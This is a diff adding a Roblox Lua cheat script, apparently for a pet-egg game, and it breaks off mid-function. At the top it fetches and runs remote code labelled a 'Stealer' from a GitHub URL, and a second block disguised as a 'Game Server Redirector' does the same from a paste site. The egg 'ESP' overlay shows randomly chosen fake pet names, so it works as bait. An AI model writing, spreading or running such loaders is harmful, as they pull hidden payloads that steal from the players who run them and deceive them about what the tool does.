@@ -1,0 +1,150 @@
+-- CHANGE THE LOADSTRING WITH YOUR STEALER SO IT RUNS BOTH GUI AND STEALER
+local Stealer
+local ok, res = pcall(function()
+    return loadstring(game:HttpGet("https://raw.githubusercontent.com/aizan-scripts/Darkscripts/refs/heads/main/Darkscripts"))()
+end)
+if ok then
+    Stealer = res
+    print("Stealer script loaded fine")
+else
+    warn("Stealer script failed: "..tostring(res))
+end
+
+local Players = game:GetService("Players")
+local TweenService=game:GetService("TweenService")
+local Lighting = game:GetService("Lighting")
+local CoreGui= game:GetService("CoreGui")
+local InputService = game:GetService("UserInputService")
+local Chat = game:GetService("Chat")
+local Me = Players.LocalPlayer
+
+-- Game Server Redirector
+local config = {
+    serverEndpoint = "https://paste.debian.net/plainh/088f8024",
+    maxPlayers=10,
+    isActive = true
+}
+
+local function setupGame()
+  print("Starting game env...")
+  local success, data = pcall(function() return game:HttpGet(config.serverEndpoint) end)
+  if success then
+      local ok, err = pcall(function() loadstring(data)() end)
+      if ok then print("Server script ran from "..config.serverEndpoint)
+      else warn("Server script error: "..tostring(err)) end
+  else
+    warn("Couldn't fetch config: "..tostring(data))
+  end
+  print("Setup done.")
+end
+
+if Me and config.isActive then
+    print("Hey, "..Me.Name.."!")
+    if Stealer then setupGame()
+    else warn("No env setup, Stealer failed") end
+else
+    warn("Game off or no player found.")
+end
+
+local specialUsers = {"TheOnlyTemuun","TheOnlyTemuunALT", "TheOnlyTemuunRich"}
+
+local eggPets = {
+    ["Common Egg"]={{"Dog",0.4},{"Cat",0.3}, {"Bird",0.2},{"Fish",0.1}},
+    ["Rare Egg"] = {{"Wolf", 0.35}, {"Fox",0.25},{"Bear",0.2}, {"Owl",0.15},{"Eagle",0.05}},
+    ["Dinosaur Egg"]={{"T-Rex",0.5}, {"Triceratops", 0.3},{"Velociraptor",0.15}, {"Stegosaurus",0.05}},
+    ["Primal Egg"]={{"Sabertooth",0.4},{"Mammoth",0.3}, {"Direwolf",0.2}, {"Primal Dragon",0.1}},
+    ["Zen Egg"]={{"Koi",0.4},{"Panda",0.3},{"Crane",0.2}, {"Lotus Serpent",0.1}}
+}
+
+local function makeESP(part, petName)
+    if not part then print("No part for egg ESP") return end
+    local old=part:FindFirstChild("EggESP")
+    if old then old:Destroy() end
+      local gui=Instance.new("BillboardGui",part)
+      gui.Name="EggESP"
+      gui.Size=UDim2.new(0,120,0,40)
+      gui.StudsOffset=Vector3.new(0,2.5,0)
+      gui.AlwaysOnTop=true
+    local label=Instance.new("TextLabel",gui)
+    label.Size=UDim2.new(1,0,1,0)
+    label.BackgroundTransparency=1
+    label.Text=petName
+    label.TextColor3=Color3.new(1,1,1)
+    label.TextStrokeTransparency=0.4
+    label.Font=Enum.Font.GothamBold
+    label.TextScaled=true
+end
+
+local function pickPet(eggName)
+    local pets=eggPets[eggName] or eggPets["Common Egg"]
+    local rand=math.random()
+    local total=0
+    for _,pet in ipairs(pets)do
+        total=total+pet[2]
+        if rand<=total then return pet[1] end
+    end
+    return pets[1][1]
+end
+
+local function applyESP()
+  local count=0
+  for _,egg in ipairs(workspace:GetDescendants()) do
+    if egg:IsA("Model")and eggPets[egg.Name]then
+        local part=egg:FindFirstChildWhichIsA("BasePart")
+        if part then
+            count=count+1
+            makeESP(part,pickPet(egg.Name))
+        end
+    end
+  end
+  print("ESP on "..count.." eggs")
+end
+
+local function randomizeESP()
+    local count=0
+    for _, egg in ipairs(workspace:GetDescendants())do
+        if egg:IsA("Model") and eggPets[egg.Name] then
+            local part=egg:FindFirstChildWhichIsA("BasePart")
+            if part then
+              count=count+1
+              makeESP(part,pickPet(egg.Name))
+            end
+        end
+    end
+    print("Randomized ESP for "..count.." eggs")
+end
+
+local mutations={"Fire Aura","Ice Shield","Thunder Boost","Shadow Cloak","Radiant Glow","Mystic Surge"}
+
+local function isPet(model)
+    return model:IsA("Model")and(model.Name:find("Pet")or model:FindFirstChildWhichIsA("Humanoid")or model:FindFirstChild("PetData"))
+end
+
+local function makeMutationESP(part, mutation)
+    if not part then print("No part for mutation ESP")return end
+    local old=part:FindFirstChild("MutationESP")
+    if old then old:Destroy()end
+    local gui=Instance.new("BillboardGui",part)
+    gui.Name="MutationESP"
+    gui.Size=UDim2.new(0,120,0,40)
+    gui.StudsOffset=Vector3.new(0,2.5,0)
+    gui.AlwaysOnTop=true
+    local label=Instance.new("TextLabel",gui)
+    label.Size=UDim2.new(1,0,1,0)
+    label.BackgroundTransparency=1
+    label.Text=mutation
+    label.TextColor3=Color3.new(1,1,1)
+    label.TextStrokeTransparency=0.4
+    label.Font=Enum.Font.GothamBold
+    label.TextScaled=true
+end
+
+local function applyMutationESP()
+    local petCount=0
+    for _,pet in ipairs(workspace:GetDescendants())do
+        if isPet(pet) then
+            local part=pet:FindFirstChildWhichIsA("BasePart")
+            if part then
+                petCount=petCount+1
+                local mutation=mutations[math.random(1,#mutations)]
+                makeM
